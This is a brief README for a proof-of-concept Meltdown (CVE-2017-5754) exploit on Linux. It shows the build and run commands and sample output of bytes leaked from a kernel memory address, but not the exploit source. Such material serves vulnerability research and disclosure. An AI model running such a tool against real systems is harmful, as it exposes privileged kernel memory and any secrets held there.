# Meltdown
PoC for Meltdown in linux (CVE-2017-5754)
### Useage
	* make
	* ./meltdown [address] [size]
### Example
  $ ./meltdown 0xffffffff81a00200 16
  [*] Leak addr : 0xffffffff81a00200 - 0xffffffff81a00210 (16)

  =========================
  0xffffffff81a00200 : b0
  0xffffffff81a00201 : 00
  0xffffffff81a00202 : 21
  0xffffffff81a00203 : 81
  0xffffffff81a00204 : ff
  0xffffffff81a00205 : ff
  0xffffffff81a00206 : ff
  0xffffffff81a00207 : ff
  0xffffffff81a00208 : 70
  0xffffffff81a00209 : 01
  0xffffffff81a0020a : 21
  0xffffffff81a0020b : 81
  0xffffffff81a0020c : ff
  0xffffffff81a0020d : ff
  0xffffffff81a0020e : ff
  0xffffffff81a0020f : ff
  =========================
